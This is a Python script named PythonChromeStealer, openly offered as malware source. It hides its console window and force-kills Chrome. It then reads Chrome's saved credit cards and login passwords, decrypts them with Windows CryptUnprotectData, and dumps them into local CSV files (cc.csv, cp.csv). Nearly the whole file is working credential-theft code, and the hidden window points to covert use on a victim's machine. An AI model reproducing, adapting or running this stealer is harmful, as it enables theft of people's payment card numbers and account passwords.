#!/usr/bin/env python3
########################################################################
# SourceCode347
#########################################################################
#PythonChromeStealer.py -o cards
#PythonChromeStealer.py -o pass
import win32api,win32console,win32gui
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0)
import os
import sys
import sqlite3
import csv
import argparse
import time
try:
	import win32crypt
except:
	pass
def args_parser():
	parser = argparse.ArgumentParser(
		description="Retrieve Google Chrome Cards Or Passwords")
	parser.add_argument("-o", "--output", choices=['cards', 'pass'],
						help="Output cards or passwords [ cards | pass ] to csv file.")
	args = parser.parse_args()
	if args.output == 'cards':
		output_csv(main())
		return
	if args.output == 'pass':
		output_csv2(main2())
		return
	else:
		parser.print_help()
def main():
	info_list = []
	path = getpath()
	try:
		connection = sqlite3.connect(path + "Web Data")
		with connection:
			cursor = connection.cursor()
			v = cursor.execute(
				'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards')
			value = v.fetchall()
		if (os.name == "posix") and (sys.platform == "darwin"):
			print("Mac OSX not supported.")
			sys.exit(0)
		for x in value:
			print (x[0])
			if os.name == 'nt':
				cardnumber =(win32crypt.CryptUnprotectData( x[1], None, None, None, 0)[1])
				cardnumber = cardnumber.decode("utf-8" , "ignore")
			else:
				cardnumber = x[1]
			print (cardnumber)
			print (x[2])
			print (x[3])
			info_list.append({
				'name': x[0],
				'cardnumber': cardnumber,
				'month': str(x[2]),
				'year': str(x[3])
			})
	except sqlite3.OperationalError as e:
		e = str(e)
		if (e == 'database is locked'):
			print('[!] Make sure Google Chrome is not running in the background')
		elif (e == 'no such table: logins'):
			print('[!] Something wrong with the database name')
		elif (e == 'unable to open database file'):
			print('[!] Something wrong with the database path')
		else:
			print(e)
		sys.exit(0)
	return info_list
def main2():
	info_list = []
	path = getpath()
	try:
		connection = sqlite3.connect(path + "Login Data")
		with connection:
			cursor = connection.cursor()
			v = cursor.execute(
				'SELECT action_url, username_value, password_value FROM logins')
			value = v.fetchall()
		if (os.name == "posix") and (sys.platform == "darwin"):
			print("Mac OSX not supported.")
			sys.exit(0)
		for origin_url, username, password in value:
			if os.name == 'nt':
				password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
				password = password.decode("utf-8","ignore")
			if password:
				info_list.append({
					'origin_url': origin_url,
					'username': username,
					'password': str(password)
				})
	except sqlite3.OperationalError as e:
		e = str(e)
		if (e == 'database is locked'):
			print('[!] Make sure Google Chrome is not running in the background')
		elif (e == 'no such table: logins'):
			print('[!] Something wrong with the database name')
		elif (e == 'unable to open database file'):
			print('[!] Something wrong with the database path')
		else:
			print(e)
		sys.exit(0)
	return info_list
def getpath():
	if os.name == "nt":
		# This is the Windows Path
		PathName = os.getenv('localappdata') + \
			'\\Google\\Chrome\\User Data\\Default\\'
	elif os.name == "posix":
		PathName = os.getenv('HOME')
		if sys.platform == "darwin":
			# This is the OS X Path
			PathName += '/Library/Application Support/Google/Chrome/Default/'
		else:
			# This is the Linux Path
			PathName += '/.config/google-chrome/Default/'
	if not os.path.isdir(PathName):
		print('[!] Chrome Doesn\'t exists')
		sys.exit(0)
	return PathName
def output_csv(info):
	try:
		with open('cc.csv', 'wb') as csv_file:
			csv_file.write('name ,cardnumber ,month ,year\n'.encode('utf-8'))
			for data in info:
				csv_file.write(('%s , %s , %s , %s \n' % (data['name'] , str(data['cardnumber']) , data['month'] , data['year'])).encode('utf-8'))
		print("Data written to cc.csv")
	except EnvironmentError:
		print('EnvironmentError: cannot write data')
def output_csv2(info):
	try:
		with open('cp.csv', 'wb') as csv_file:
			csv_file.write('origin_url,username,password \n'.encode('utf-8'))
			for data in info:
				csv_file.write(('%s , %s , %s \n' % (data['origin_url'] , data[
					'username'] , data['password'])).encode('utf-8'))
		print("Data written to cp.csv")
	except EnvironmentError:
		print('EnvironmentError: cannot write data')
if __name__ == '__main__':
	try:
		os.system("pkill chrome")
		time.sleep(2)
	except:
		pass
	try:
		os.system("Taskkill /IM chrome.exe /F")
		time.sleep(2)
	except:
		pass
	args_parser()
